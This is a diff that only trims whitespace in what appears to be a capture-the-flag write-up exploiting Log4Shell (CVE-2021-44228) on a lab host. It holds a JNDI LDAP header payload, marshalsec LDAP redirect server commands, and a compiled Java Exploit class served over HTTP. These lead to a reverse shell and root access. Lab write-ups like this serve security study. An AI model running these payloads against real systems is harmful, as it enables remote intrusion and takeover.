@@ -49,24 +49,24 @@ error                (Status: 500) [Size: 73]
 ~logs                (Status: 200) [Size: 29]
 Progress: 40938 / 40938 (100.00%)
 ===============================================================
-Finished                                                                                                                                                  
+Finished
 ===============================================================
 ```
 
 We have 1 hit, heading to it will again prompt us to enumerate more.
 
 ```bash
-kali@kali:gobuster dir -u http://10.48.141.102/~logs -w /usr/share/wordlists/dirb/big.txt -x php                                                                
-===============================================================                                                                                           
-Gobuster v3.8.2                                                                                                                                           
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                             
-===============================================================                                                                                           
-[+] Url:                     http://10.48.141.102/~logs                                                                                                   
-[+] Method:                  GET                                                                                                                          
-[+] Threads:                 10                                                                                                                           
-[+] Wordlist:                /usr/share/wordlists/dirb/big.txt                                                                                            
-[+] Negative Status codes:   404                                                                                                                          
-[+] User Agent:              gobuster/3.8.2                                                                                                               
+kali@kali:gobuster dir -u http://10.48.141.102/~logs -w /usr/share/wordlists/dirb/big.txt -x php
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.48.141.102/~logs
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
 [+] Extensions:              php
 [+] Timeout:                 10s
 ===============================================================
@@ -86,7 +86,7 @@ CVE-2021-44228 is Apache-Log4j-RCE vulnerability. We can do a quick test.
 Start a listener.
 
 ```bash
-kali@kali:nc -nlvp 4444                                                                                                                                         
+kali@kali:nc -nlvp 4444
 listening on [any] 4444 ...
 ```
 
@@ -96,11 +96,11 @@ Send a request using the vulnerablr header.
 kali@kali:curl -L -i 'http://10.48.141.102/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://192.168.130.26:4444}'
 ```
 ```bash
-kali@kali:nc -nlvp 4444                                                                                                                                         
+kali@kali:nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [192.168.130.26] from (UNKNOWN) [10.48.141.102] 39418
 0
- ` 
+ `
 ```
 
 We receive a connection back. Thus we can exploit this to get a RCE.
@@ -108,7 +108,7 @@ We receive a connection back. Thus we can exploit this to get a RCE.
 First we have to create a ldap server.
 
 ```bash
-kali@kali:git clone https://github.com/mbechler/marshalsec                                                                                                      
+kali@kali:git clone https://github.com/mbechler/marshalsec
 Cloning into 'marshalsec'...
 remote: Enumerating objects: 186, done.
 remote: Counting objects: 100% (43/43), done.
@@ -121,9 +121,9 @@ Resolving deltas: 100% (91/91), done.
 Build the project.
 
 ```bash
-kali@kali:mvn clean package -DskipTests                                                                                                                         
+kali@kali:mvn clean package -DskipTests
 [INFO] Scanning for projects...
-[INFO] 
+[INFO]
 [INFO] ----------------< org.eenterphace.mbechler:marshalsec >-----------------
 [INFO] Building marshalsec 0.0.3-SNAPSHOT
 [INFO]   from pom.xml
@@ -142,7 +142,7 @@ The build was successful, now we can run the server. The server will redirect th
 
 ```bash
 kali@kali:java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.130.26:8000/#Exploit"
-Listening on 0.0.0.0:1389                                                                                                                                 
+Listening on 0.0.0.0:1389
 ```                     
 
 Now, from another terminal create a java reverse shell exploit.
@@ -190,21 +190,21 @@ public class Exploit {
 Compile the project.
 
 ```bash
-kali@kali:javac Exploit.java -source 8 -target 8                                                                                                                
-warning: [options] bootstrap class path not set in conjunction with -source 8                                                                             
-warning: [options] source value 8 is obsolete and will be removed in a future release                                                                     
-warning: [options] target value 8 is obsolete and will be removed in a future release                                                                     
-warning: [options] To suppress warnings about obsolete options, use -Xlint:-options.                                                                      
-4 warnings                                                                                                                                                
-                                                                                                                                                         
-kali@kali:ls                                                                                                                                                    
-Exploit.class  Exploit.java  LICENSE.txt  marshalsec.pdf  pom.xml  README.md  src  target 
+kali@kali:javac Exploit.java -source 8 -target 8
+warning: [options] bootstrap class path not set in conjunction with -source 8
+warning: [options] source value 8 is obsolete and will be removed in a future release
+warning: [options] target value 8 is obsolete and will be removed in a future release
+warning: [options] To suppress warnings about obsolete options, use -Xlint:-options.
+4 warnings
+
+kali@kali:ls
+Exploit.class  Exploit.java  LICENSE.txt  marshalsec.pdf  pom.xml  README.md  src  target
 ```
 
 Let's start the python server and a listener.
 
 ```bash
-kali@kali:python3 -m http.server 8000                                                                                                                           
+kali@kali:python3 -m http.server 8000
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 ```bash
@@ -223,7 +223,7 @@ This will send a request to our ldap server. Our ldap server will redirect it to
 
 ```bash
 kali@kali:java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.130.26:8000/#Exploit"
-Listening on 0.0.0.0:1389                                                                                                                                 
+Listening on 0.0.0.0:1389
 Send LDAP reference result for Exploit redirecting to http://192.168.130.26:8000/Exploit.class
 ```
 
@@ -239,7 +239,7 @@ kali@kali:penelope -p 4444
 [+] Attempting to spawn a reverse shell on 192.168.130.26:4444
 [+] Got reverse shell from 81fbbf1def70~10.48.141.102-Linux-x86_64 😍 Assigned SessionID <2>
 [+] Shell upgraded successfully using /usr/bin/script! 💪
-[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
 [+] Logging to /home/kali/.penelope/sessions/81fbbf1def70~10.48.141.102-Linux-x86_64/2026_02_23-18_51_57-646.log 📜
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 bash-4.4# id
@@ -271,12 +271,12 @@ Device         Boot Start      End  Sectors Size Id Type
 Disk /dev/nvme1n1: 1 GiB, 1073741824 bytes, 2097152 sectors
 Units: sectors of 1 * 512 = 512 bytes
 Sector size (logical/physical): 512 bytes / 512 bytes
-I/O size (minimum/optimal): 4096 bytes / 4096 bytes                                                                                                       
-                                                                                                                                                          
-                                                                                                                                                          
+I/O size (minimum/optimal): 4096 bytes / 4096 bytes
+
+
 Disk /dev/nvme2n1: 1 GiB, 1073741824 bytes, 2097152 sectors                                                                                               
-Units: sectors of 1 * 512 = 512 bytes                                                                                                                     
-Sector size (logical/physical): 512 bytes / 512 bytes                                                                                                     
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
 I/O size (minimum/optimal): 4096 bytes / 4096 bytes
 ```
 
